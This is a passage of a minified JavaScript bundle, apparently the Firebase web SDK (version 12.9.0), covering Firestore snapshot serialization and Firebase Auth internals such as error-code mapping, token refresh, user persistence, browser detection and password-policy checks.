d.type!==0&&(p=c.indexOf(d.doc.key),c=c.delete(d.doc.key)),d.type!==1&&(c=c.add(d.doc),v=c.indexOf(d.doc.key)),{type:aw(d.type),doc:f,oldIndex:p,newIndex:v}}))}})(this,t),this._cachedChangesIncludeMetadataChanges=t),this._cachedChanges}toJSON(){if(this.metadata.hasPendingWrites)throw new xe(de.FAILED_PRECONDITION,"QuerySnapshot.toJSON() attempted to serialize a document with pending writes. Await waitForPendingWrites() before invoking toJSON().");const e={};e.type=Ys._jsonSchemaVersion,e.bundleSource="QuerySnapshot",e.bundleName=ib.newId(),this._firestore._databaseId.database,this._firestore._databaseId.projectId;const t=[],o=[],r=[];return this.docs.forEach((l=>{l._document!==null&&(t.push(l._document),o.push(this._userDataWriter.convertObjectMap(l._document.data.value.mapValue.fields,"previous")),r.push(l.ref.path))})),e.bundle=(this._firestore,this.query._query,e.bundleName,"NOT SUPPORTED"),e}}function aw(a){switch(a){case 0:return"added";case 2:case 3:return"modified";case 1:return"removed";default:return we(61501,{type:a})}}Ys._jsonSchemaVersion="firestore/querySnapshot/1.0",Ys._jsonSchema={type:Ya("string",Ys._jsonSchemaVersion),bundleSource:Ya("string","QuerySnapshot"),bundleName:Ya("string"),bundle:Ya("string")};function tw(a){a=Wi(a,et);const e=Wi(a.firestore,nu),t=Lb(e);return kD(t,a._key).then((o=>k0(e,a,o)))}function Nh(a,e,t){a=Wi(a,et);const o=Wi(a.firestore,nu),r=ew(a.converter,e,t),l=JD(o);return nw(o,[QD(l,"setDoc",a._key,r,a.converter!==null,t).toMutation(a._key,Ko.none())])}function _0(a,...e){a=Ot(a);let t={includeMetadataChanges:!1,source:"default"},o=0;typeof e[o]!="object"||v1(e[o])||(t=e[o++]);const r={includeMetadataChanges:t.includeMetadataChanges,source:t.source};if(v1(e[o])){const p=e[o];e[o]=p.next?.bind(p),e[o+1]=p.error?.bind(p),e[o+2]=p.complete?.bind(p)}let l,c,d;if(a instanceof et)c=Wi(a.firestore,nu),d=om(a._key.path),l={next:p=>{e[o]&&e[o](k0(c,a,p))},error:e[o+1],complete:e[o+2]};else{const p=Wi(a,mm);c=Wi(p.firestore,nu),d=p._query;const v=new w0(c);l={next:y=>{e[o]&&e[o](new Ys(c,v,p,y))},error:e[o+1],complete:e[o+2]},ZD(a._query)}const f=Lb(c);return _D(f,d,r,l)}function nw(a,e){const t=Lb(a);return ND(t,e)}function k0(a,e,t){const o=t.docs.get(e._key),r=new w0(a);return new Vr(a,r,e._key,o,new Oc(t.hasPendingWrites,t.fromCache),e.converter)}(function(e,t=!0){kL(ul),tl(new Hr("firestore",((o,{instanceIdentifier:r,options:l})=>{const c=o.getProvider("app").getImmediate(),d=new nu(new zL(o.getProvider("auth-internal")),new VL(c,o.getProvider("app-check-internal")),r2(c,r),c);return l={useFetchStreams:t,...l},d._setSettings(l),d}),"PUBLIC").setMultipleInstances(!0)),Gi(g1,b1,e),Gi(g1,b1,"esm2020")})();var ow="firebase",iw="12.9.0";Gi(ow,iw,"app");function N0(){return{"dependent-sdk-initialized-before-auth":"Another Firebase SDK was initialized and is trying to use Auth before Auth is initialized. Please be sure to call `initializeAuth` or `getAuth` before starting any other Firebase SDK."}}const rw=N0,O0=new cu("auth","Firebase",N0());const zp=new ab("@firebase/auth");function sw(a,...e){zp.logLevel<=$e.WARN&&zp.warn(`Auth (${ul}): ${a}`,...e)}function gp(a,...e){zp.logLevel<=$e.ERROR&&zp.error(`Auth (${ul}): ${a}`,...e)}function En(a,...e){throw Mb(a,...e)}function Nn(a,...e){return Mb(a,...e)}function wb(a,e,t){const o={...rw(),[e]:t};return new cu("auth","Firebase",o).create(e,{appName:a.name})}function $o(a){return wb(a,"operation-not-supported-in-this-environment","Operations that alter the current user are not supported in conjunction with FirebaseServerApp")}function lw(a,e,t){const o=t;if(!(e instanceof o))throw o.name!==e.constructor.name&&En(a,"argument-error"),wb(a,"argument-error",`Type of ${e.constructor.name} does not match expected instance.Did you pass a reference from a different Auth SDK?`)}function Mb(a,...e){if(typeof a!="string"){const t=e[0],o=[...e.slice(1)];return o[0]&&(o[0].appName=a.name),a._errorFactory.create(t,...o)}return O0.create(a,...e)}function De(a,e,...t){if(!a)throw Mb(e,...t)}function Qo(a){const e="INTERNAL ASSERTION FAILED: "+a;throw gp(e),new Error(e)}function ai(a,e){a||Qo(e)}function wg(){return typeof self<"u"&&self.location?.href||""}function cw(){return y1()==="http:"||y1()==="https:"}function y1(){return typeof self<"u"&&self.location?.protocol||null}function uw(){return typeof navigator<"u"&&navigator&&"onLine"in navigator&&typeof navigator.onLine=="boolean"&&(cw()||hR()||"connection"in navigator)?navigator.onLine:!0}function dw(){if(typeof navigator>"u")return null;const a=navigator;return a.languages&&a.languages[0]||a.language||null}class gu{constructor(e,t){this.shortDelay=e,this.longDelay=t,ai(t>e,"Short delay should be less than long delay!"),this.isMobile=pR()||gR()}get(){return uw()?this.isMobile?this.longDelay:this.shortDelay:Math.min(5e3,this.shortDelay)}}function _b(a,e){ai(a.emulator,"Emulator should always be set here");const{url:t}=a.emulator;return e?`${t}${e.startsWith("/")?e.slice(1):e}`:t}class z0{static initialize(e,t,o){this.fetchImpl=e,t&&(this.headersImpl=t),o&&(this.responseImpl=o)}static fetch(){if(this.fetchImpl)return this.fetchImpl;if(typeof self<"u"&&"fetch"in self)return self.fetch;if(typeof globalThis<"u"&&globalThis.fetch)return globalThis.fetch;if(typeof fetch<"u")return fetch;Qo("Could not find fetch implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static headers(){if(this.headersImpl)return this.headersImpl;if(typeof self<"u"&&"Headers"in self)return self.Headers;if(typeof globalThis<"u"&&globalThis.Headers)return globalThis.Headers;if(typeof Headers<"u")return Headers;Qo("Could not find Headers implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static response(){if(this.responseImpl)return this.responseImpl;if(typeof self<"u"&&"Response"in self)return self.Response;if(typeof globalThis<"u"&&globalThis.Response)return globalThis.Response;if(typeof Response<"u")return Response;Qo("Could not find Response implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}}const pw={CREDENTIAL_MISMATCH:"custom-token-mismatch",MISSING_CUSTOM_TOKEN:"internal-error",INVALID_IDENTIFIER:"invalid-email",MISSING_CONTINUE_URI:"internal-error",INVALID_PASSWORD:"wrong-password",MISSING_PASSWORD:"missing-password",INVALID_LOGIN_CREDENTIALS:"invalid-credential",EMAIL_EXISTS:"email-already-in-use",PASSWORD_LOGIN_DISABLED:"operation-not-allowed",INVALID_IDP_RESPONSE:"invalid-credential",INVALID_PENDING_TOKEN:"invalid-credential",FEDERATED_USER_ID_ALREADY_LINKED:"credential-already-in-use",MISSING_REQ_TYPE:"internal-error",EMAIL_NOT_FOUND:"user-not-found",RESET_PASSWORD_EXCEED_LIMIT:"too-many-requests",EXPIRED_OOB_CODE:"expired-action-code",INVALID_OOB_CODE:"invalid-action-code",MISSING_OOB_CODE:"internal-error",CREDENTIAL_TOO_OLD_LOGIN_AGAIN:"requires-recent-login",INVALID_ID_TOKEN:"invalid-user-token",TOKEN_EXPIRED:"user-token-expired",USER_NOT_FOUND:"user-token-expired",TOO_MANY_ATTEMPTS_TRY_LATER:"too-many-requests",PASSWORD_DOES_NOT_MEET_REQUIREMENTS:"password-does-not-meet-requirements",INVALID_CODE:"invalid-verification-code",INVALID_SESSION_INFO:"invalid-verification-id",INVALID_TEMPORARY_PROOF:"invalid-credential",MISSING_SESSION_INFO:"missing-verification-id",SESSION_EXPIRED:"code-expired",MISSING_ANDROID_PACKAGE_NAME:"missing-android-pkg-name",UNAUTHORIZED_DOMAIN:"unauthorized-continue-uri",INVALID_OAUTH_CLIENT_ID:"invalid-oauth-client-id",ADMIN_ONLY_OPERATION:"admin-restricted-operation",INVALID_MFA_PENDING_CREDENTIAL:"invalid-multi-factor-session",MFA_ENROLLMENT_NOT_FOUND:"multi-factor-info-not-found",MISSING_MFA_ENROLLMENT_ID:"missing-multi-factor-info",MISSING_MFA_PENDING_CREDENTIAL:"missing-multi-factor-session",SECOND_FACTOR_EXISTS:"second-factor-already-in-use",SECOND_FACTOR_LIMIT_EXCEEDED:"maximum-second-factor-count-exceeded",BLOCKING_FUNCTION_ERROR_RESPONSE:"internal-error",RECAPTCHA_NOT_ENABLED:"recaptcha-not-enabled",MISSING_RECAPTCHA_TOKEN:"missing-recaptcha-token",INVALID_RECAPTCHA_TOKEN:"invalid-recaptcha-token",INVALID_RECAPTCHA_ACTION:"invalid-recaptcha-action",MISSING_CLIENT_TYPE:"missing-client-type",MISSING_RECAPTCHA_VERSION:"missing-recaptcha-version",INVALID_RECAPTCHA_VERSION:"invalid-recaptcha-version",INVALID_REQ_TYPE:"invalid-req-type"};const mw=["/v1/accounts:signInWithCustomToken","/v1/accounts:signInWithEmailLink","/v1/accounts:signInWithIdp","/v1/accounts:signInWithPassword","/v1/accounts:signInWithPhoneNumber","/v1/token"],fw=new gu(3e4,6e4);function ar(a,e){return a.tenantId&&!e.tenantId?{...e,tenantId:a.tenantId}:e}async function tr(a,e,t,o,r={}){return U0(a,r,async()=>{let l={},c={};o&&(e==="GET"?c=o:l={body:JSON.stringify(o)});const d=uu({key:a.config.apiKey,...c}).slice(1),f=await a._getAdditionalHeaders();f["Content-Type"]="application/json",a.languageCode&&(f["X-Firebase-Locale"]=a.languageCode);const p={method:e,headers:f,...l};return fR()||(p.referrerPolicy="no-referrer"),a.emulatorConfig&&cl(a.emulatorConfig.host)&&(p.credentials="include"),z0.fetch()(await B0(a,a.config.apiHost,t,d),p)})}async function U0(a,e,t){a._canInitEmulator=!1;const o={...pw,...e};try{const r=new gw(a),l=await Promise.race([t(),r.promise]);r.clearNetworkTimeout();const c=await l.json();if("needConfirmation"in c)throw ep(a,"account-exists-with-different-credential",c);if(l.ok&&!("errorMessage"in c))return c;{const d=l.ok?c.errorMessage:c.error.message,[f,p]=d.split(" : ");if(f==="FEDERATED_USER_ID_ALREADY_LINKED")throw ep(a,"credential-already-in-use",c);if(f==="EMAIL_EXISTS")throw ep(a,"email-already-in-use",c);if(f==="USER_DISABLED")throw ep(a,"user-disabled",c);const v=o[f]||f.toLowerCase().replace(/[_\s]+/g,"-");if(p)throw wb(a,v,p);En(a,v)}}catch(r){if(r instanceof ni)throw r;En(a,"network-request-failed",{message:String(r)})}}async function bu(a,e,t,o,r={}){const l=await tr(a,e,t,o,r);return"mfaPendingCredential"in l&&En(a,"multi-factor-auth-required",{_serverResponse:l}),l}async function B0(a,e,t,o){const r=`${e}${t}?${o}`,l=a,c=l.config.emulator?_b(a.config,r):`${a.config.apiScheme}://${r}`;return mw.includes(t)&&(await l._persistenceManagerAvailable,l._getPersistenceType()==="COOKIE")?l._getPersistence()._getFinalTarget(c).toString():c}function hw(a){switch(a){case"ENFORCE":return"ENFORCE";case"AUDIT":return"AUDIT";case"OFF":return"OFF";default:return"ENFORCEMENT_STATE_UNSPECIFIED"}}class gw{clearNetworkTimeout(){clearTimeout(this.timer)}constructor(e){this.auth=e,this.timer=null,this.promise=new Promise((t,o)=>{this.timer=setTimeout(()=>o(Nn(this.auth,"network-request-failed")),fw.get())})}}function ep(a,e,t){const o={appName:a.name};t.email&&(o.email=t.email),t.phoneNumber&&(o.phoneNumber=t.phoneNumber);const r=Nn(a,e,o);return r.customData._tokenResponse=t,r}function E1(a){return a!==void 0&&a.enterprise!==void 0}class bw{constructor(e){if(this.siteKey="",this.recaptchaEnforcementState=[],e.recaptchaKey===void 0)throw new Error("recaptchaKey undefined");this.siteKey=e.recaptchaKey.split("/")[3],this.recaptchaEnforcementState=e.recaptchaEnforcementState}getProviderEnforcementState(e){if(!this.recaptchaEnforcementState||this.recaptchaEnforcementState.length===0)return null;for(const t of this.recaptchaEnforcementState)if(t.provider&&t.provider===e)return hw(t.enforcementState);return null}isProviderEnabled(e){return this.getProviderEnforcementState(e)==="ENFORCE"||this.getProviderEnforcementState(e)==="AUDIT"}isAnyProviderEnabled(){return this.isProviderEnabled("EMAIL_PASSWORD_PROVIDER")||this.isProviderEnabled("PHONE_PROVIDER")}}async function vw(a,e){return tr(a,"GET","/v2/recaptchaConfig",ar(a,e))}async function yw(a,e){return tr(a,"POST","/v1/accounts:delete",e)}async function Up(a,e){return tr(a,"POST","/v1/accounts:lookup",e)}function Hc(a){if(a)try{const e=new Date(Number(a));if(!isNaN(e.getTime()))return e.toUTCString()}catch{}}async function Ew(a,e=!1){const t=Ot(a),o=await t.getIdToken(e),r=kb(o);De(r&&r.exp&&r.auth_time&&r.iat,t.auth,"internal-error");const l=typeof r.firebase=="object"?r.firebase:void 0,c=l?.sign_in_provider;return{claims:r,token:o,authTime:Hc(Oh(r.auth_time)),issuedAtTime:Hc(Oh(r.iat)),expirationTime:Hc(Oh(r.exp)),signInProvider:c||null,signInSecondFactor:l?.sign_in_second_factor||null}}function Oh(a){return Number(a)*1e3}function kb(a){const[e,t,o]=a.split(".");if(e===void 0||t===void 0||o===void 0)return gp("JWT malformed, contained fewer than 3 sections"),null;try{const r=JA(t);return r?JSON.parse(r):(gp("Failed to decode base64 JWT payload"),null)}catch(r){return gp("Caught error parsing JWT payload as JSON",r?.toString()),null}}function S1(a){const e=kb(a);return De(e,"internal-error"),De(typeof e.exp<"u","internal-error"),De(typeof e.iat<"u","internal-error"),Number(e.exp)-Number(e.iat)}async function ou(a,e,t=!1){if(t)return e;try{return await e}catch(o){throw o instanceof ni&&Sw(o)&&a.auth.currentUser===a&&await a.auth.signOut(),o}}function Sw({code:a}){return a==="auth/user-disabled"||a==="auth/user-token-expired"}class Cw{constructor(e){this.user=e,this.isRunning=!1,this.timerId=null,this.errorBackoff=3e4}_start(){this.isRunning||(this.isRunning=!0,this.schedule())}_stop(){this.isRunning&&(this.isRunning=!1,this.timerId!==null&&clearTimeout(this.timerId))}getInterval(e){if(e){const t=this.errorBackoff;return this.errorBackoff=Math.min(this.errorBackoff*2,96e4),t}else{this.errorBackoff=3e4;const o=(this.user.stsTokenManager.expirationTime??0)-Date.now()-3e5;return Math.max(0,o)}}schedule(e=!1){if(!this.isRunning)return;const t=this.getInterval(e);this.timerId=setTimeout(async()=>{await this.iteration()},t)}async iteration(){try{await this.user.getIdToken(!0)}catch(e){e?.code==="auth/network-request-failed"&&this.schedule(!0);return}this.schedule()}}class Mg{constructor(e,t){this.createdAt=e,this.lastLoginAt=t,this._initializeTime()}_initializeTime(){this.lastSignInTime=Hc(this.lastLoginAt),this.creationTime=Hc(this.createdAt)}_copy(e){this.createdAt=e.createdAt,this.lastLoginAt=e.lastLoginAt,this._initializeTime()}toJSON(){return{createdAt:this.createdAt,lastLoginAt:this.lastLoginAt}}}async function Bp(a){const e=a.auth,t=await a.getIdToken(),o=await ou(a,Up(e,{idToken:t}));De(o?.users.length,e,"internal-error");const r=o.users[0];a._notifyReloadListener(r);const l=r.providerUserInfo?.length?V0(r.providerUserInfo):[],c=Tw(a.providerData,l),d=a.isAnonymous,f=!(a.email&&r.passwordHash)&&!c?.length,p=d?f:!1,v={uid:r.localId,displayName:r.displayName||null,photoURL:r.photoUrl||null,email:r.email||null,emailVerified:r.emailVerified||!1,phoneNumber:r.phoneNumber||null,tenantId:r.tenantId||null,providerData:c,metadata:new Mg(r.createdAt,r.lastLoginAt),isAnonymous:p};Object.assign(a,v)}async function Aw(a){const e=Ot(a);await Bp(e),await e.auth._persistUserIfCurrent(e),e.auth._notifyListenersIfCurrent(e)}function Tw(a,e){return[...a.filter(o=>!e.some(r=>r.providerId===o.providerId)),...e]}function V0(a){return a.map(({providerId:e,...t})=>({providerId:e,uid:t.rawId||"",displayName:t.displayName||null,email:t.email||null,phoneNumber:t.phoneNumber||null,photoURL:t.photoUrl||null}))}async function xw(a,e){const t=await U0(a,{},async()=>{const o=uu({grant_type:"refresh_token",refresh_token:e}).slice(1),{tokenApiHost:r,apiKey:l}=a.config,c=await B0(a,r,"/v1/token",`key=${l}`),d=await a._getAdditionalHeaders();d["Content-Type"]="application/x-www-form-urlencoded";const f={method:"POST",headers:d,body:o};return a.emulatorConfig&&cl(a.emulatorConfig.host)&&(f.credentials="include"),z0.fetch()(c,f)});return{accessToken:t.access_token,expiresIn:t.expires_in,refreshToken:t.refresh_token}}async function jw(a,e){return tr(a,"POST","/v2/accounts:revokeToken",ar(a,e))}class Xs{constructor(){this.refreshToken=null,this.accessToken=null,this.expirationTime=null}get isExpired(){return!this.expirationTime||Date.now()>this.expirationTime-3e4}updateFromServerResponse(e){De(e.idToken,"internal-error"),De(typeof e.idToken<"u","internal-error"),De(typeof e.refreshToken<"u","internal-error");const t="expiresIn"in e&&typeof e.expiresIn<"u"?Number(e.expiresIn):S1(e.idToken);this.updateTokensAndExpiration(e.idToken,e.refreshToken,t)}updateFromIdToken(e){De(e.length!==0,"internal-error");const t=S1(e);this.updateTokensAndExpiration(e,null,t)}async getToken(e,t=!1){return!t&&this.accessToken&&!this.isExpired?this.accessToken:(De(this.refreshToken,e,"user-token-expired"),this.refreshToken?(await this.refresh(e,this.refreshToken),this.accessToken):null)}clearRefreshToken(){this.refreshToken=null}async refresh(e,t){const{accessToken:o,refreshToken:r,expiresIn:l}=await xw(e,t);this.updateTokensAndExpiration(o,r,Number(l))}updateTokensAndExpiration(e,t,o){this.refreshToken=t||null,this.accessToken=e||null,this.expirationTime=Date.now()+o*1e3}static fromJSON(e,t){const{refreshToken:o,accessToken:r,expirationTime:l}=t,c=new Xs;return o&&(De(typeof o=="string","internal-error",{appName:e}),c.refreshToken=o),r&&(De(typeof r=="string","internal-error",{appName:e}),c.accessToken=r),l&&(De(typeof l=="number","internal-error",{appName:e}),c.expirationTime=l),c}toJSON(){return{refreshToken:this.refreshToken,accessToken:this.accessToken,expirationTime:this.expirationTime}}_assign(e){this.accessToken=e.accessToken,this.refreshToken=e.refreshToken,this.expirationTime=e.expirationTime}_clone(){return Object.assign(new Xs,this.toJSON())}_performRefresh(){return Qo("not implemented")}}function Ni(a,e){De(typeof a=="string"||typeof a>"u","internal-error",{appName:e})}class _n{constructor({uid:e,auth:t,stsTokenManager:o,...r}){this.providerId="firebase",this.proactiveRefresh=new Cw(this),this.reloadUserInfo=null,this.reloadListener=null,this.uid=e,this.auth=t,this.stsTokenManager=o,this.accessToken=o.accessToken,this.displayName=r.displayName||null,this.email=r.email||null,this.emailVerified=r.emailVerified||!1,this.phoneNumber=r.phoneNumber||null,this.photoURL=r.photoURL||null,this.isAnonymous=r.isAnonymous||!1,this.tenantId=r.tenantId||null,this.providerData=r.providerData?[...r.providerData]:[],this.metadata=new Mg(r.createdAt||void 0,r.lastLoginAt||void 0)}async getIdToken(e){const t=await ou(this,this.stsTokenManager.getToken(this.auth,e));return De(t,this.auth,"internal-error"),this.accessToken!==t&&(this.accessToken=t,await this.auth._persistUserIfCurrent(this),this.auth._notifyListenersIfCurrent(this)),t}getIdTokenResult(e){return Ew(this,e)}reload(){return Aw(this)}_assign(e){this!==e&&(De(this.uid===e.uid,this.auth,"internal-error"),this.displayName=e.displayName,this.photoURL=e.photoURL,this.email=e.email,this.emailVerified=e.emailVerified,this.phoneNumber=e.phoneNumber,this.isAnonymous=e.isAnonymous,this.tenantId=e.tenantId,this.providerData=e.providerData.map(t=>({...t})),this.metadata._copy(e.metadata),this.stsTokenManager._assign(e.stsTokenManager))}_clone(e){const t=new _n({...this,auth:e,stsTokenManager:this.stsTokenManager._clone()});return t.metadata._copy(this.metadata),t}_onReload(e){De(!this.reloadListener,this.auth,"internal-error"),this.reloadListener=e,this.reloadUserInfo&&(this._notifyReloadListener(this.reloadUserInfo),this.reloadUserInfo=null)}_notifyReloadListener(e){this.reloadListener?this.reloadListener(e):this.reloadUserInfo=e}_startProactiveRefresh(){this.proactiveRefresh._start()}_stopProactiveRefresh(){this.proactiveRefresh._stop()}async _updateTokensIfNecessary(e,t=!1){let o=!1;e.idToken&&e.idToken!==this.stsTokenManager.accessToken&&(this.stsTokenManager.updateFromServerResponse(e),o=!0),t&&await Bp(this),await this.auth._persistUserIfCurrent(this),o&&this.auth._notifyListenersIfCurrent(this)}async delete(){if(Yt(this.auth.app))return Promise.reject($o(this.auth));const e=await this.getIdToken();return await ou(this,yw(this.auth,{idToken:e})),this.stsTokenManager.clearRefreshToken(),this.auth.signOut()}toJSON(){return{uid:this.uid,email:this.email||void 0,emailVerified:this.emailVerified,displayName:this.displayName||void 0,isAnonymous:this.isAnonymous,photoURL:this.photoURL||void 0,phoneNumber:this.phoneNumber||void 0,tenantId:this.tenantId||void 0,providerData:this.providerData.map(e=>({...e})),stsTokenManager:this.stsTokenManager.toJSON(),_redirectEventId:this._redirectEventId,...this.metadata.toJSON(),apiKey:this.auth.config.apiKey,appName:this.auth.name}}get refreshToken(){return this.stsTokenManager.refreshToken||""}static _fromJSON(e,t){const o=t.displayName??void 0,r=t.email??void 0,l=t.phoneNumber??void 0,c=t.photoURL??void 0,d=t.tenantId??void 0,f=t._redirectEventId??void 0,p=t.createdAt??void 0,v=t.lastLoginAt??void 0,{uid:y,emailVerified:S,isAnonymous:A,providerData:R,stsTokenManager:L}=t;De(y&&L,e,"internal-error");const x=Xs.fromJSON(this.name,L);De(typeof y=="string",e,"internal-error"),Ni(o,e.name),Ni(r,e.name),De(typeof S=="boolean",e,"internal-error"),De(typeof A=="boolean",e,"internal-error"),Ni(l,e.name),Ni(c,e.name),Ni(d,e.name),Ni(f,e.name),Ni(p,e.name),Ni(v,e.name);const D=new _n({uid:y,auth:e,email:r,emailVerified:S,displayName:o,isAnonymous:A,photoURL:c,phoneNumber:l,tenantId:d,stsTokenManager:x,createdAt:p,lastLoginAt:v});return R&&Array.isArray(R)&&(D.providerData=R.map(G=>({...G}))),f&&(D._redirectEventId=f),D}static async _fromIdTokenResponse(e,t,o=!1){const r=new Xs;r.updateFromServerResponse(t);const l=new _n({uid:t.localId,auth:e,stsTokenManager:r,isAnonymous:o});return await Bp(l),l}static async _fromGetAccountInfoResponse(e,t,o){const r=t.users[0];De(r.localId!==void 0,"internal-error");const l=r.providerUserInfo!==void 0?V0(r.providerUserInfo):[],c=!(r.email&&r.passwordHash)&&!l?.length,d=new Xs;d.updateFromIdToken(o);const f=new _n({uid:r.localId,auth:e,stsTokenManager:d,isAnonymous:c}),p={uid:r.localId,displayName:r.displayName||null,photoURL:r.photoUrl||null,email:r.email||null,emailVerified:r.emailVerified||!1,phoneNumber:r.phoneNumber||null,tenantId:r.tenantId||null,providerData:l,metadata:new Mg(r.createdAt,r.lastLoginAt),isAnonymous:!(r.email&&r.passwordHash)&&!l?.length};return Object.assign(f,p),f}}const C1=new Map;function Wo(a){ai(a instanceof Function,"Expected a class definition");let e=C1.get(a);return e?(ai(e instanceof a,"Instance stored in cache mismatched with class"),e):(e=new a,C1.set(a,e),e)}class F0{constructor(){this.type="NONE",this.storage={}}async _isAvailable(){return!0}async _set(e,t){this.storage[e]=t}async _get(e){const t=this.storage[e];return t===void 0?null:t}async _remove(e){delete this.storage[e]}_addListener(e,t){}_removeListener(e,t){}}F0.type="NONE";const A1=F0;function bp(a,e,t){return`firebase:${a}:${e}:${t}`}class Zs{constructor(e,t,o){this.persistence=e,this.auth=t,this.userKey=o;const{config:r,name:l}=this.auth;this.fullUserKey=bp(this.userKey,r.apiKey,l),this.fullPersistenceKey=bp("persistence",r.apiKey,l),this.boundEventHandler=t._onStorageEvent.bind(t),this.persistence._addListener(this.fullUserKey,this.boundEventHandler)}setCurrentUser(e){return this.persistence._set(this.fullUserKey,e.toJSON())}async getCurrentUser(){const e=await this.persistence._get(this.fullUserKey);if(!e)return null;if(typeof e=="string"){const t=await Up(this.auth,{idToken:e}).catch(()=>{});return t?_n._fromGetAccountInfoResponse(this.auth,t,e):null}return _n._fromJSON(this.auth,e)}removeCurrentUser(){return this.persistence._remove(this.fullUserKey)}savePersistenceForRedirect(){return this.persistence._set(this.fullPersistenceKey,this.persistence.type)}async setPersistence(e){if(this.persistence===e)return;const t=await this.getCurrentUser();if(await this.removeCurrentUser(),this.persistence=e,t)return this.setCurrentUser(t)}delete(){this.persistence._removeListener(this.fullUserKey,this.boundEventHandler)}static async create(e,t,o="authUser"){if(!t.length)return new Zs(Wo(A1),e,o);const r=(await Promise.all(t.map(async p=>{if(await p._isAvailable())return p}))).filter(p=>p);let l=r[0]||Wo(A1);const c=bp(o,e.config.apiKey,e.name);let d=null;for(const p of t)try{const v=await p._get(c);if(v){let y;if(typeof v=="string"){const S=await Up(e,{idToken:v}).catch(()=>{});if(!S)break;y=await _n._fromGetAccountInfoResponse(e,S,v)}else y=_n._fromJSON(e,v);p!==l&&(d=y),l=p;break}}catch{}const f=r.filter(p=>p._shouldAllowMigration);return!l._shouldAllowMigration||!f.length?new Zs(l,e,o):(l=f[0],d&&await l._set(c,d.toJSON()),await Promise.all(t.map(async p=>{if(p!==l)try{await p._remove(c)}catch{}})),new Zs(l,e,o))}}function T1(a){const e=a.toLowerCase();if(e.includes("opera/")||e.includes("opr/")||e.includes("opios/"))return"Opera";if(Q0(e))return"IEMobile";if(e.includes("msie")||e.includes("trident/"))return"IE";if(e.includes("edge/"))return"Edge";if(H0(e))return"Firefox";if(e.includes("silk/"))return"Silk";if(K0(e))return"Blackberry";if($0(e))return"Webos";if(G0(e))return"Safari";if((e.includes("chrome/")||J0(e))&&!e.includes("edge/"))return"Chrome";if(W0(e))return"Android";{const t=/([a-zA-Z\d\.]+)\/[a-zA-Z\d\.]*$/,o=a.match(t);if(o?.length===2)return o[1]}return"Other"}function H0(a=Ct()){return/firefox\//i.test(a)}function G0(a=Ct()){const e=a.toLowerCase();return e.includes("safari/")&&!e.includes("chrome/")&&!e.includes("crios/")&&!e.includes("android")}function J0(a=Ct()){return/crios\//i.test(a)}function Q0(a=Ct()){return/iemobile/i.test(a)}function W0(a=Ct()){return/android/i.test(a)}function K0(a=Ct()){return/blackberry/i.test(a)}function $0(a=Ct()){return/webos/i.test(a)}function Nb(a=Ct()){return/iphone|ipad|ipod/i.test(a)||/macintosh/i.test(a)&&/mobile/i.test(a)}function Pw(a=Ct()){return Nb(a)&&!!window.navigator?.standalone}function qw(){return bR()&&document.documentMode===10}function Y0(a=Ct()){return Nb(a)||W0(a)||$0(a)||K0(a)||/windows phone/i.test(a)||Q0(a)}function X0(a,e=[]){let t;switch(a){case"Browser":t=T1(Ct());break;case"Worker":t=`${T1(Ct())}-${a}`;break;default:t=a}const o=e.length?e.join(","):"FirebaseCore-web";return`${t}/JsCore/${ul}/${o}`}class Rw{constructor(e){this.auth=e,this.queue=[]}pushCallback(e,t){const o=l=>new Promise((c,d)=>{try{const f=e(l);c(f)}catch(f){d(f)}});o.onAbort=t,this.queue.push(o);const r=this.queue.length-1;return()=>{this.queue[r]=()=>Promise.resolve()}}async runMiddleware(e){if(this.auth.currentUser===e)return;const t=[];try{for(const o of this.queue)await o(e),o.onAbort&&t.push(o.onAbort)}catch(o){t.reverse();for(const r of t)try{r()}catch{}throw this.auth._errorFactory.create("login-blocked",{originalMessage:o?.message})}}}async function Lw(a,e={}){return tr(a,"GET","/v2/passwordPolicy",ar(a,e))}const Iw=6;class Dw{constructor(e){const t=e.customStrengthOptions;this.customStrengthOptions={},this.customStrengthOptions.minPasswordLength=t.minPasswordLength??Iw,t.maxPasswordLength&&(this.customStrengthOptions.maxPasswordLength=t.maxPasswordLength),t.containsLowercaseCharacter!==void 0&&(this.customStrengthOptions.containsLowercaseLetter=t.containsLowercaseCharacter),t.containsUppercaseCharacter!==void 0&&(this.customStrengthOptions.containsUppercaseLetter=t.containsUppercaseCharacter),t.containsNumericCharacter!==void 0&&(this.customStrengthOptions.containsNumericCharacter=t.containsNumericCharacter),t.containsNonAlphanumericCharacter!==void 0&&(this.customStrengthOptions.containsNonAlphanumericCharacter=t.containsNonAlphanumericCharacter),this.enforcementState=e.enforcementState,this.enforcementState==="ENFORCEMENT_STATE_UNSPECIFIED"&&(this.enforcementState="OFF"),this.allowedNonAlphanumericCharacters=e.allowedNonAlphanumericCharacters?.join("")??"",this.forceUpgradeOnSignin=e.forceUpgradeOnSignin??!1,this.schemaVersion=e.schemaVersion}validatePassword(e){const t={isValid:!0,passwordPolicy:this};return this.validatePasswordLengthOptions(e,t),this.validatePasswordCharacterOptions(e,t),t.isValid&&(t.isValid=t.meetsMinPasswordLength??!0),t.isValid&&(t.isValid=t.meetsMaxPasswordLength??!0),t.isValid&&(t.isValid=t.containsLowercaseLetter??!0),t.isValid&&(t.isValid=t.containsUppercaseLetter??!0),t.isValid&&(t.isValid=t.containsNumericCharacter??!0),t.isValid&&(t.isValid=t.containsNonAlphanumericCharacter??!0),t}validatePasswordLengthOptions(e,t){const o=this.customStrengthOptions.minPasswordLength,r=this.customStrengthOptions.maxPasswordLength;o&&(t.meetsMinPasswordLength=e.length>=o),r&&(t.meetsMaxPasswordLength=e.length<=r)}validatePasswordCharacterOptions(e,t){this.updatePasswordCharacterOptionsStatuses(t,!1,!1,!1,!1);let o;for(let r=0;r<e.length;r++)o=e.charAt(r),this.updatePasswordCharacterOptionsStatuses(t,o>="a"&&o<="z",o>="A"&&o<="Z",o>="0"&&o<="9",this.allowedNonAlphanumericCharacters.includes(o))}updatePasswordCharacterOptionsStatuses(e,t,o,r,l){this.customStrengthOptions.containsLowercaseLetter&&(e.containsLowercaseLetter||(e.containsLowercaseLetter=t)),this.customStrengthOptions.containsUppercaseLetter&&(e.containsUppercaseLetter||(e.containsUppercaseLetter=o)),this.customStrengthOptions.containsNumericCharacter&&(e.containsNumericCharacter||(e.containsNumericCharacter=r)),this.customStrengthOptions.containsNonAlphanumericCharacter&&(e.containsNonAlphanumericCharacter||(e.containsNonAlphanumericCharacter=l))}}class 